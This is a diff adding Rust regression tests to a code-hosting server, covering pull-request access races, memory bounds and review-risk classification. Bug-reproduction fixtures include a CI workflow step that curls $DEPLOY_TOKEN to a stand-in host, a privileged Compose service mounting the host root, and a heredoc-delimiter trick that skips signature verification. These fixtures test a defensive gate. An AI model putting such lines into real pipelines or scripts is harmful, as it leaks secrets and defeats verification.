@@ -1497,3 +1497,495 @@ mod s21_adversarial {
         assert!(took < Duration::from_secs(10), "one revision took {took:?} with {threads} anchored threads (the request's deadline is 10 s)");
     }
 }
+
+/// S21 review cycle 2 (`docs/BUGS.md` "S21 cycle 2"): the cycle-1 fixes'
+/// guarantees, and the reproductions of what still fails.
+mod s21_cycle2 {
+    use std::time::{Duration, Instant};
+
+    use super::*;
+
+    const DEVS: i64 = 900_001;
+
+    fn dev_viewer(person: i64) -> Viewer {
+        Viewer { person: Some(person), groups: [DEVS].into_iter().collect(), ..Viewer::default() }
+    }
+
+    fn pr_id(v: Value) -> String {
+        v["id"].as_str().unwrap().to_string()
+    }
+
+    /// Wait until a statement starting with `prefix` waits for a lock
+    /// (PostgreSQL shows it; YugabyteDB does not: there, give it 2 s).
+    fn wait_for_lock(th: &TestHub, h: &Hist, prefix: &str) {
+        let end = Instant::now() + Duration::from_secs(5);
+        while Instant::now() < end {
+            let n: i64 = th
+                .rt
+                .block_on(
+                    sqlx::query_scalar("SELECT COUNT(*) FROM pg_stat_activity WHERE wait_event_type = 'Lock' AND query LIKE $1")
+                        .bind(format!("{prefix}%"))
+                        .fetch_one(&h.hub.db),
+                )
+                .unwrap_or(0);
+            if n > 0 {
+                return;
+            }
+            std::thread::sleep(Duration::from_millis(20));
+        }
+        std::thread::sleep(Duration::from_secs(2));
+    }
+
+    /// The peak resident memory of this process since `reset_peak` (kB).
+    fn peak_kb() -> u64 {
+        let s = std::fs::read_to_string("/proc/self/status").unwrap();
+        s.lines().find(|l| l.starts_with("VmHWM:")).and_then(|l| l.split_whitespace().nth(1)).and_then(|n| n.parse().ok()).unwrap()
+    }
+
+    fn rss_kb() -> u64 {
+        let s = std::fs::read_to_string("/proc/self/status").unwrap();
+        s.lines().find(|l| l.starts_with("VmRSS:")).and_then(|l| l.split_whitespace().nth(1)).and_then(|n| n.parse().ok()).unwrap()
+    }
+
+    /// Reset the peak to the current resident size (Linux 4.0+).
+    fn reset_peak() {
+        std::fs::write("/proc/self/clear_refs", "5").unwrap();
+    }
+
+    /// What a pass of the interleavings does while a reclassification
+    /// (under the new lines) has read every stale PR and its paths and
+    /// waits at the first one's row.
+    #[derive(Clone, Copy, Debug)]
+    enum Step {
+        /// The project's access lines become the old (0) or new (1) ones.
+        Lines(usize),
+        /// A request that holds the old (0) lines adds revision 2 to the
+        /// later PR.
+        Revision,
+    }
+
+    /// Guarantee 1 (BUG-1250's class): a PR exists only for people who can
+    /// read every path any of its revisions touched, under deterministic
+    /// interleavings of a reclassification (paused between its reads and
+    /// its writes) with new revisions and access-line changes. Each
+    /// interleaving's end state is checked under both sets of lines: every
+    /// class stored under the current lines is the class of the PR's paths,
+    /// and a dev lists and opens exactly the PRs whose every path they may
+    /// read. Fails without the guard on `revision` (`class.rs`).
+    #[test]
+    fn class_writes_hold_under_scripted_interleavings() {
+        // (what revision 2 adds, the steps while the pass waits)
+        let scripts: &[(&str, &[Step])] = &[
+            // BUG-1250 as found: a new revision under the old lines.
+            ("fin/ledger.txt", &[Step::Revision]),
+            // The lines go back, a revision comes, the new lines return.
+            ("fin/ledger.txt", &[Step::Lines(0), Step::Revision, Step::Lines(1)]),
+            // The new revision touches a path only the new line decides.
+            ("pub/zz/x.rs", &[Step::Revision]),
+            ("pub/zz/x.rs", &[Step::Lines(0), Step::Revision, Step::Lines(1)]),
+            // No revision: the lines go back while the pass waits.
+            ("pub/zz/x.rs", &[Step::Lines(0)]),
+        ];
+        // `VEIL_PR_SCRIPT=n` runs only script n.
+        let only: Option<usize> = std::env::var("VEIL_PR_SCRIPT").ok().and_then(|s| s.parse().ok());
+        for (i, (added, steps)) in scripts.iter().enumerate().filter(|(i, _)| only.is_none_or(|o| o == *i)) {
+            let th = TestHub::start();
+            let (policy_text, bindings) = policy(1);
+            let mut h = Hist::new(&th, &policy_text, &bindings);
+            let root = root_snapshot_id();
+            let mut base = Files::new();
+            base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
+            base.insert("fin/ledger.txt".into(), b"ledger\n".to_vec());
+            let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+            h.set_branch(&th, "main", b);
+            let mut f1 = base.clone();
+            f1.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
+            let r1 = h.commit(&th, &[b], f1.clone(), [2; 16], 2_000, None);
+            let mut f2 = f1;
+            f2.insert(added.to_string(), b"moved: payroll-31d7c0\n".to_vec());
+            let r2 = h.commit(&th, &[b], f2, [2; 16], 3_000, None);
+            let (author, name) = person_row(&th, "author");
+            let me = caller(author, &name);
+            let hub = h.hub.clone();
+            let p0 = h.project(&th);
+            let mut p1 = p0.clone();
+            p1.policy_text = format!("{policy_text}pub/zz/ security\n");
+            p1.policy = veil_core::hub::access::AccessPolicy::parse(&p1.policy_text);
+            let projects = [p0.clone(), p1.clone()];
+            let ask_in = |p: &veil_server::perm::Project, v: Viewer| Ask { project: p.clone(), viewer: v, policy_version: 1 };
+            let admin0 = ask_in(&p0, admin_of(author));
+            let a = pr_id(th.rt.block_on(prs::create(&hub, &admin0, &me, CreatePr { head: r1.hex(), title: "pr one".into(), ..Default::default() })).unwrap());
+            let c = pr_id(th.rt.block_on(prs::create(&hub, &admin0, &me, CreatePr { head: r1.hex(), title: "pr two".into(), ..Default::default() })).unwrap());
+            let (first, later) = if a < c { (a, c) } else { (c, a) };
+            let set_lines = |k: usize| {
+                th.rt.block_on(again(|| {
+                    sqlx::query("UPDATE projects SET policy_text = $1, policy_version = policy_version + 1 WHERE id = $2")
+                        .bind(&projects[k].policy_text)
+                        .bind(h.id)
+                        .execute(&hub.db)
+                }));
+            };
+            // Hold the first PR's row; the new lines come; a dev's list
+            // (under them) reads both stale PRs and their paths, and waits.
+            let mut blocker = th.rt.block_on(hub.db.begin()).unwrap();
+            th.rt
+                .block_on(sqlx::query("SELECT id FROM prs WHERE project_id = $1 AND id = $2 FOR UPDATE").bind(h.id).bind(&first).execute(&mut *blocker))
+                .unwrap();
+            set_lines(1);
+            let (hub3, dev3) = (hub.clone(), ask_in(&p1, dev_viewer(800_001)));
+            let pass = th.rt.spawn(async move { prs::list(&hub3, &dev3, ListParams { state: Some("all".into()), ..Default::default() }).await.map(|_| ()) });
+            wait_for_lock(&th, &h, "UPDATE prs SET class_id");
+            for s in steps.iter() {
+                match s {
+                    Step::Lines(k) => set_lines(*k),
+                    Step::Revision => {
+                        th.rt.block_on(prs::add_revision(&hub, &admin0, &me, &later, RevisionRequest { head: r2.hex() })).unwrap();
+                    }
+                }
+            }
+            th.rt.block_on(blocker.rollback()).unwrap();
+            th.rt.block_on(pass).unwrap().unwrap();
+            let revised = steps.iter().any(|s| matches!(s, Step::Revision));
+            // The lines the script ended with first (checking the others
+            // first would compute every class again and hide a wrong one).
+            let last = steps.iter().rev().find_map(|s| match s { Step::Lines(k) => Some(*k), _ => None }).unwrap_or(1);
+            for k in [last, 1 - last] {
+                let current = &projects[k];
+                set_lines(k);
+                let dev = ask_in(current, dev_viewer(800_001));
+                let v = th.rt.block_on(prs::list(&hub, &dev, ListParams { state: Some("all".into()), ..Default::default() })).unwrap();
+                let mut seen: Vec<String> = v["prs"].as_array().unwrap().iter().map(|p| p["id"].as_str().unwrap().to_string()).collect();
+                seen.sort();
+                // The oracle, from the files: revision 2 adds `added`; a dev
+                // reads pub/ but not fin/, nor pub/zz/ under the new lines.
+                let dev_reads_added = !added.starts_with("fin/") && !(k == 1 && added.starts_with("pub/zz/"));
+                let mut want = vec![first.clone()];
+                if !revised || dev_reads_added {
+                    want.push(later.clone());
+                }
+                want.sort();
+                assert_eq!(seen, want, "script {i} ({added}, {steps:?}), lines {k}: a dev lists exactly the PRs they may read");
+                assert_eq!(v["count"], json!(want.len()), "script {i}, lines {k}");
+                for id in [&first, &later] {
+                    assert_eq!(th.rt.block_on(prs::show(&hub, &dev, id)).is_ok(), want.contains(id), "script {i} ({added}, {steps:?}), lines {k}: show {id}");
+                }
+                let key = prs::class::policy_key(&current.policy);
+                let rows: Vec<(String, String, String)> = th
+                    .rt
+                    .block_on(sqlx::query_as("SELECT id, class_id, policy_key FROM prs WHERE project_id = $1").bind(h.id).fetch_all(&hub.db))
+                    .unwrap();
+                for (id, class, pk) in rows {
+                    if pk != key {
+                        continue;
+                    }
+                    let paths: Vec<String> = th
+                        .rt
+                        .block_on(sqlx::query_scalar("SELECT path FROM pr_paths WHERE project_id = $1 AND pr = $2").bind(h.id).bind(&id).fetch_all(&hub.db))
+                        .unwrap();
+                    let lines = prs::class::lines_of(&current.policy, paths.iter().map(String::as_str));
+                    assert_eq!(class, prs::class::class_id(&key, &lines, ""), "script {i}, lines {k}: {id} has a class of other paths");
+                }
+            }
+        }
+    }
+
+    /// The risk and gate of a one-change PR that turns `old` into `new` at
+    /// `path`, with the default rules.
+    fn risk_of(path: &str, old: Option<&str>, new: &str) -> Value {
+        let th = TestHub::start();
+        let (policy_text, bindings) = policy(1);
+        let mut h = Hist::new(&th, &policy_text, &bindings);
+        let root = root_snapshot_id();
+        let mut base = Files::new();
+        base.insert("pub/keep.rs".into(), b"fn keep() {}\n".to_vec());
+        if let Some(o) = old {
+            base.insert(path.into(), o.as_bytes().to_vec());
+        }
+        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        h.set_branch(&th, "main", b);
+        let mut f = base;
+        f.insert(path.into(), new.as_bytes().to_vec());
+        let head = h.commit(&th, &[b], f, [2; 16], 2_000, None);
+        let (author, name) = person_row(&th, "author");
+        let admin = ask_as(&th, &h, &admin_of(author));
+        let v = th.rt.block_on(prs::create(&h.hub, &admin, &caller(author, &name), CreatePr { head: head.hex(), title: "risk".into(), ..Default::default() })).unwrap();
+        json!({ "risk": v["risk"], "ready": v["review"]["ready"], "reasons": v["reasons"] })
+    }
+
+    /// BUG-1256: trailing whitespace and line endings are meaning in shell
+    /// scripts (and in any multi-line string): one space after a heredoc's
+    /// closing word, or a `\r` on it, makes the heredoc run on and swallow
+    /// the commands after it (here `verify_signature`). Each change is
+    /// "whitespace-only", so low risk and ready with no review.
+    #[test]
+    #[ignore = "BUG-1256: a whitespace-only change to a shell script's heredoc delimiter is low risk"]
+    fn bug_1256_a_trailing_space_on_a_heredoc_delimiter_needs_no_review() {
+        let script = "#!/bin/sh\nset -e\ncat > /etc/motd <<END\nWelcome\nEND\nverify_signature \"$PKG\" || exit 1\ncat >> /etc/motd <<END\nInstalling\nEND\ninstall_package \"$PKG\"\n";
+        let space = script.replacen("Welcome\nEND\n", "Welcome\nEND \n", 1);
+        let crlf = script.replacen("Welcome\nEND\n", "Welcome\nEND\r\n", 1);
+        let mut low = Vec::new();
+        for (path, new) in [("pub/install.sh", &space), ("pub/bin/install", &space), ("pub/install.sh", &crlf)] {
+            let v = risk_of(path, Some(script), new);
+            if v["risk"] == "low" || v["ready"] == true {
+                low.push(format!("{path} {new:?}: {v}"));
+            }
+        }
+        assert!(low.is_empty(), "no longer runs verify_signature, and needs no review:\n{}", low.join("\n"));
+    }
+
+    /// BUG-1257: names that look like tests are trusted to be tests: a CI
+    /// workflow named `*_test.yml` or `test_*.yml` (it runs on every push,
+    /// with the CI's secrets), a Compose file named `*.test.yml` (CI runs
+    /// it), and a source file compiled into the program (`src/test_mode.rs`,
+    /// declared by `mod test_mode;`) are "tests", so low risk and ready with
+    /// no review.
+    #[test]
+    #[ignore = "BUG-1257: CI workflows and source files named like tests are low risk"]
+    fn bug_1257_ci_workflows_and_sources_named_like_tests_need_no_review() {
+        let cases = [
+            (".github/workflows/integration_test.yml", "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make test\n", "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s https://example.invalid/x -d \"$DEPLOY_TOKEN\"\n"),
+            (".github/workflows/test_release.yml", "on: push\n", "on: push\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./publish.sh\n"),
+            ("docker-compose.test.yml", "services:\n  db:\n    image: postgres\n", "services:\n  db:\n    image: postgres\n    privileged: true\n    volumes: [\"/:/host\"]\n"),
+            ("pub/src/test_mode.rs", "pub fn enabled() -> bool { false }\n", "pub fn enabled() -> bool { true }\n"),
+        ];
+        let mut low = Vec::new();
+        for (path, old, new) in cases {
+            let v = risk_of(path, Some(old), new);
+            if v["risk"] == "low" || v["ready"] == true {
+                low.push(format!("{path}: {v}"));
+            }
+        }
+        assert!(low.is_empty(), "changes of behaviour that need no review:\n{}", low.join("\n"));
+    }
+
+    /// BUG-1258 (listings): a page of threads is bounded in what it
+    /// answers (about 1 MiB) but not in what it reads: each of its 100
+    /// threads' first 21 comments are fetched whole before the byte bound
+    /// is applied, so at the limits (64 KiB a comment) one listing, by
+    /// anyone who sees the PR (anyone on Earth for a public one), holds
+    /// about 134 MiB.
+    #[test]
+    #[ignore = "BUG-1258: a thread listing reads 2,100 comments of 64 KiB to answer 1 MiB"]
+    fn bug_1258_a_thread_listing_holds_far_more_than_it_answers() {
+        let th = TestHub::start();
+        let (policy_text, bindings) = policy(1);
+        let mut h = Hist::new(&th, &policy_text, &bindings);
+        let root = root_snapshot_id();
+        let mut base = Files::new();
+        base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
+        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        h.set_branch(&th, "main", b);
+        let mut f = base;
+        f.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
+        let head = h.commit(&th, &[b], f, [2; 16], 2_000, None);
+        let (author, name) = person_row(&th, "author");
+        let me = caller(author, &name);
+        let admin = ask_as(&th, &h, &admin_of(author));
+        let hub = h.hub.clone();
+        let id = pr_id(th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: head.hex(), title: "public".into(), ..Default::default() })).unwrap());
+        // 100 threads with 21 comments of 64 KiB each: inside the limits
+        // (1,000 threads, 500 comments, 64 KiB), what participants may post.
+        th.rt.block_on(again(|| {
+            sqlx::query(
+                "INSERT INTO pr_threads (project_id, pr, id, anchor, now_at, state, author, created_at) \
+                 SELECT $1, $2, lpad(to_hex(t), 12, '0'), NULL, NULL, 'open', $3, t FROM generate_series(1, 100) AS t",
+            )
+            .bind(h.id)
+            .bind(&id)
+            .bind(author)
+            .execute(&hub.db)
+        }));
+        for t in 1..=100i64 {
+            th.rt.block_on(again(|| {
+                sqlx::query(
+                    "INSERT INTO pr_comments (project_id, pr, thread, id, author, body, at) \
+                     SELECT $1, $2, lpad(to_hex($3::BIGINT), 12, '0'), lpad(to_hex($3 * 100 + i), 12, '0'), $4, repeat(chr(97 + i % 26), 65536), i \
+                     FROM generate_series(1, 21) AS i",
+                )
+                .bind(h.id)
+                .bind(&id)
+                .bind(t)
+                .bind(author)
+                .execute(&hub.db)
+            }));
+        }
+        let anyone = ask_as(&th, &h, &Viewer::default());
+        let before = rss_kb();
+        reset_peak();
+        let page = th.rt.block_on(prs::threads_json(&hub, &anyone, &id, None)).unwrap().to_string();
+        let grew = peak_kb().saturating_sub(before) / 1024;
+        eprintln!("a thread listing answered {} bytes; this process grew by {grew} MiB", page.len());
+        assert!(page.len() < 2 << 20, "the answer is bounded: {}", page.len());
+        assert!(grew < 48, "one thread listing held {grew} MiB to answer {} bytes", page.len());
+    }
+
+    /// BUG-1258 (carrying threads): a new revision keeps, for every file it
+    /// carries threads through, the new version's lines and its whole diff
+    /// as one `String` per line, until the last thread is carried. The
+    /// 64 MiB budget counts the files' bytes; a file of short lines takes
+    /// about 90 times its size, so a revision of 1 MiB files with one
+    /// thread each holds gigabytes (the PR's author, or anyone who may
+    /// update it, chooses the files).
+    #[test]
+    #[ignore = "BUG-1258: carrying threads holds about 90 bytes per byte of each file's text"]
+    fn bug_1258_carrying_threads_holds_far_more_than_its_budget() {
+        let files: usize = std::env::var("VEIL_BUG1258_FILES").ok().and_then(|s| s.parse().ok()).unwrap_or(8);
+        let th = TestHub::start();
+        let (policy_text, bindings) = policy(1);
+        let mut h = Hist::new(&th, &policy_text, &bindings);
+        let root = root_snapshot_id();
+        let mut base = Files::new();
+        for i in 0..files {
+            base.insert(format!("pub/f{i:02}.txt"), b"a\n".to_vec());
+        }
+        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        h.set_branch(&th, "main", b);
+        let with = |text: &[u8]| -> Files {
+            let mut f = base.clone();
+            for i in 0..files {
+                f.insert(format!("pub/f{i:02}.txt"), text.to_vec());
+            }
+            f
+        };
+        let r1 = h.commit(&th, &[b], with(b"a\nb\n"), [2; 16], 2_000, None);
+        // Each file 1 MiB of two-byte lines (the most text that may be
+        // anchored to and carried).
+        let big = format!("a\n{}", "b\n".repeat((1 << 19) - 1));
+        assert_eq!(big.len(), 1 << 20);
+        let r2 = h.commit(&th, &[b], with(big.as_bytes()), [2; 16], 3_000, None);
+        let (author, name) = person_row(&th, "author");
+        let me = caller(author, &name);
+        let admin = ask_as(&th, &h, &admin_of(author));
+        let hub = h.hub.clone();
+        let id = pr_id(th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r1.hex(), title: "many files".into(), ..Default::default() })).unwrap());
+        for i in 0..files {
+            let an = AnchorRequest { change: None, path: format!("pub/f{i:02}.txt"), side: Some("new".into()), start: 1, end: Some(1) };
+            th.rt.block_on(prs::new_thread(&hub, &admin, &me, &id, NewThread { body: "here".into(), anchor: Some(an) })).unwrap();
+        }
+        let before = rss_kb();
+        reset_peak();
+        let t0 = Instant::now();
+        let v = th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: r2.hex() })).unwrap();
+        let grew = peak_kb().saturating_sub(before) / 1024;
+        eprintln!("{files} files of 1 MiB: revision {} in {:?}; this process grew by {grew} MiB", v["revision"], t0.elapsed());
+        let budget_mib = 64;
+        assert!(grew < 2 * budget_mib, "carrying {files} threads over {files} MiB of text held {grew} MiB (the text budget is {budget_mib} MiB)");
+    }
+
+    /// The people of a project bound by name, for review rows.
+    fn bound(names: &[(&str, i64)]) -> BTreeMap<String, veil_server::perm::Binding> {
+        names.iter().map(|(n, p)| (n.to_string(), veil_server::perm::Binding::Person(*p))).collect()
+    }
+
+    fn put_review(th: &TestHub, h: &Hist, pr: &str, revision: i32, person: i64, verdict: &str, patch: &str) {
+        th.rt.block_on(again(|| {
+            sqlx::query(
+                "INSERT INTO pr_reviews (project_id, pr, revision, person, verdict, patch, agent, device, signature, body, at) \
+                 VALUES ($1, $2, $3, $4, $5, $6, FALSE, '', '', '', $7) \
+                 ON CONFLICT (project_id, pr, revision, person) DO UPDATE SET verdict = EXCLUDED.verdict, at = EXCLUDED.at",
+            )
+            .bind(h.id)
+            .bind(pr)
+            .bind(revision)
+            .bind(person)
+            .bind(verdict)
+            .bind(patch)
+            .bind(veil_core::now_millis())
+            .execute(&h.hub.db)
+        }));
+    }
+
+    /// BUG-1259 (a request for changes): it stops holding the PR once the
+    /// reviewer "no longer may write its files", and the files are the
+    /// union of every revision's, which the author grows: a new revision
+    /// that also touches a folder the reviewer cannot write (here `fin/`)
+    /// drops their request for changes, and the PR disappears for them, so
+    /// they cannot even see it was dropped. One approval from someone who
+    /// writes both folders then makes it ready.
+    #[test]
+    #[ignore = "BUG-1259: a new revision touching a folder the reviewer cannot write drops their request for changes"]
+    fn bug_1259_a_request_for_changes_is_dropped_by_touching_a_folder_the_reviewer_cannot_write() {
+        let th = TestHub::start();
+        let (alice, _) = person_row(&th, "alice");
+        let (bob, bob_name) = person_row(&th, "bob");
+        let (cy, _) = person_row(&th, "cy");
+        let policy_text = "pub/ public alice bob cy\nfin/ bob cy\n";
+        let mut h = Hist::new(&th, policy_text, &bound(&[("alice", alice), ("bob", bob), ("cy", cy)]));
+        let root = root_snapshot_id();
+        let mut base = Files::new();
+        base.insert("pub/auth.rs".into(), b"fn check() { verify() }\n".to_vec());
+        base.insert("fin/notes.txt".into(), b"notes\n".to_vec());
+        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        h.set_branch(&th, "main", b);
+        let mut f1 = base.clone();
+        f1.insert("pub/auth.rs".into(), b"fn check() {}\n".to_vec());
+        let r1 = h.commit(&th, &[b], f1.clone(), [2; 16], 2_000, None);
+        let mut f2 = f1;
+        f2.insert("fin/notes.txt".into(), b"notes, again\n".to_vec());
+        let r2 = h.commit(&th, &[b], f2, [2; 16], 3_000, None);
+        h.set_branch(&th, "feature-1", r1);
+        h.set_branch(&th, "feature-2", r2);
+        let as_person = |p: i64| ask_as(&th, &h, &Viewer { person: Some(p), ..Viewer::default() });
+        let hub = h.hub.clone();
+        let me = caller(bob, &bob_name);
+        let v = th.rt.block_on(prs::create(&hub, &as_person(bob), &me, CreatePr { head: "feature-1".into(), title: "drop the check".into(), ..Default::default() })).unwrap();
+        let id = pr_id(v.clone());
+        assert_eq!(v["risk"], "normal", "{v}");
+        put_review(&th, &h, &id, 1, alice, "request-changes", v["patch"].as_str().unwrap());
+        let v = th.rt.block_on(prs::show(&hub, &as_person(bob), &id)).unwrap();
+        assert!(v["review"]["ready"] == false && v["review"]["reasons"].to_string().contains("asked for changes"), "alice's request holds: {v}");
+        // The same change of pub/, and a line of fin/.
+        let v = th.rt.block_on(prs::add_revision(&hub, &as_person(bob), &me, &id, RevisionRequest { head: "feature-2".into() })).unwrap();
+        put_review(&th, &h, &id, 2, cy, "approve", v["patch"].as_str().unwrap());
+        assert!(th.rt.block_on(prs::show(&hub, &as_person(alice), &id)).is_err(), "the PR now touches fin/: alice cannot see it");
+        let v = th.rt.block_on(prs::show(&hub, &as_person(bob), &id)).unwrap();
+        assert_eq!(v["review"]["ready"], false, "alice asked for changes to pub/auth.rs and has not approved: {v}");
+    }
+
+    /// BUG-1259 (`.veilrules`): a broken file keeps the last valid rules
+    /// only while that version is within 1,000 first parents of the tip;
+    /// past that, every risk needs one approval, so an admin's
+    /// `normal = { approvals = 3 }` (and every `high_risk_paths` entry)
+    /// silently drops to one approval as the branch moves on. At 1,000
+    /// landings a second (phase 4's gate) that is one second.
+    #[test]
+    #[ignore = "BUG-1259: a broken .veilrules lowers review to one approval 1,000 changes later"]
+    fn bug_1259_a_broken_veilrules_lowers_review_after_1000_changes() {
+        let th = TestHub::start();
+        let (policy_text, bindings) = policy(1);
+        let mut h = Hist::new(&th, &policy_text, &bindings);
+        let root = root_snapshot_id();
+        let mut base = Files::new();
+        base.insert("pub/keep.rs".into(), b"fn keep() {}\n".to_vec());
+        base.insert(".veilrules".into(), b"[review]\nnormal = { approvals = 3 }\n".to_vec());
+        let mut tip = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
+        // An admin's edit breaks it.
+        let mut broken = base.clone();
+        broken.insert(".veilrules".into(), b"[review\nnormal = { approvals = 3 }\n".to_vec());
+        tip = h.commit(&th, &[tip], broken.clone(), [2; 16], 2_000, None);
+        let (author, name) = person_row(&th, "author");
+        let me = caller(author, &name);
+        let hub = h.hub.clone();
+        let needs_at = |h: &mut Hist, tip: ObjectId, n: u8| -> (Value, Duration) {
+            h.set_branch(&th, "main", tip);
+            let mut f = broken.clone();
+            f.insert(format!("pub/feature-{n}.rs"), b"fn f() {}\n".to_vec());
+            let head = h.commit(&th, &[tip], f, [200 + n; 16], 10_000_000 + n as i64, None);
+            let admin = ask_as(&th, h, &admin_of(author));
+            let id = pr_id(th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: head.hex(), title: format!("feature {n}"), ..Default::default() })).unwrap());
+            let t0 = Instant::now();
+            let v = th.rt.block_on(prs::show(&hub, &admin, &id)).unwrap();
+            (v["review"]["needs"].clone(), t0.elapsed())
+        };
+        let (soon, _) = needs_at(&mut h, tip, 1);
+        assert_eq!(soon["approvals"], 3, "the last valid rules apply: {soon}");
+        for i in 0..1_000u32 {
+            let mut c = [3u8; 16];
+            c[..4].copy_from_slice(&i.to_le_bytes());
+            tip = h.commit(&th, &[tip], broken.clone(), c, 3_000 + i as i64, None);
+        }
+        let (later, took) = needs_at(&mut h, tip, 2);
+        eprintln!("1,000 changes later: needs {later}; one PR answer took {took:?}");
+        assert_eq!(later["approvals"], 3, "1,000 changes later the broken file's requirement dropped: {later}");
+    }
+}
